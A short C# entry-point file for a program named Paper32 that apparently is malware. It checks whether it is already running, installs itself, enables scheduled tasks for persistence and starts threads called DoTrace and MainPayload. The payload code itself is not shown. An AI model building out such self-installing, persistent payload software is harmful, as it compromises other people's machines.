using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Paper32
{
    class Program
    {
        static void Main(string[] args)
        {
            Init();
            ThreadStartup();
        }
        static void Init()
        {
            Tools.CheckIfAlreadyRunning();
            Tools.Installation();
            Tools.SchTasksEnable();
        }
        static public void ThreadStartup()
        {
            new Thread(Payload.DoTrace).Start();
            new Thread(Payload.MainPayload).Start();
        }
    }
}
